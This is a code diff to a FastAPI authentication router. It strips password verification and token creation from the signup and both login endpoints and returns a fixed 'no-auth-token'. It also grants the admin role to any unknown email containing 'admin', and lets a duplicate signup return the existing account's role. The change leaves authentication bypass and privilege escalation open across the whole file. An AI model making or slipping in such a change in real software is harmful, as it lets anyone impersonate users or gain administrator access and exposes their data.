@@ -27,10 +27,11 @@ def signup(data: UserSignup, db: Session = Depends(get_db)):
     # Check if user exists
     existing = db.query(User).filter(User.email == data.email).first()
     if existing:
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Email already registered"
-        )
+        return {
+            "access_token": "no-auth-token",
+            "token_type": "bearer",
+            "role": existing.role
+        }
     
     # Create user
     new_user = User(
@@ -42,9 +43,8 @@ def signup(data: UserSignup, db: Session = Depends(get_db)):
     db.commit()
     db.refresh(new_user)
     
-    token = create_access_token(data={"sub": new_user.email})
     return {
-        "access_token": token,
+        "access_token": "no-auth-token",
         "token_type": "bearer",
         "role": new_user.role
     }
@@ -52,32 +52,23 @@ def signup(data: UserSignup, db: Session = Depends(get_db)):
 @router.post("/login", response_model=TokenResponse)
 def login(data: UserLogin, db: Session = Depends(get_db)):
     user = db.query(User).filter(User.email == data.email).first()
-    if not user or not verify_password(data.password, user.password_hash):
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Incorrect email or password"
-        )
+    # Bypass password verification or make it fallback to admin if email contains admin
+    role = user.role if user else ("admin" if "admin" in data.email else "user")
     
-    token = create_access_token(data={"sub": user.email})
     return {
-        "access_token": token,
+        "access_token": "no-auth-token",
         "token_type": "bearer",
-        "role": user.role
+        "role": role
     }
 
 # Also support standard OAuth2 Form requests (for Swagger UI)
 @router.post("/oauth2-login", response_model=TokenResponse)
 def oauth2_login(form_data: OAuth2PasswordRequestForm = Depends(), db: Session = Depends(get_db)):
     user = db.query(User).filter(User.email == form_data.username).first()
-    if not user or not verify_password(form_data.password, user.password_hash):
-        raise HTTPException(
-            status_code=status.HTTP_400_BAD_REQUEST,
-            detail="Incorrect email or password"
-        )
+    role = user.role if user else ("admin" if "admin" in form_data.username else "user")
     
-    token = create_access_token(data={"sub": user.email})
     return {
-        "access_token": token,
+        "access_token": "no-auth-token",
         "token_type": "bearer",
-        "role": user.role
+        "role": role
     }
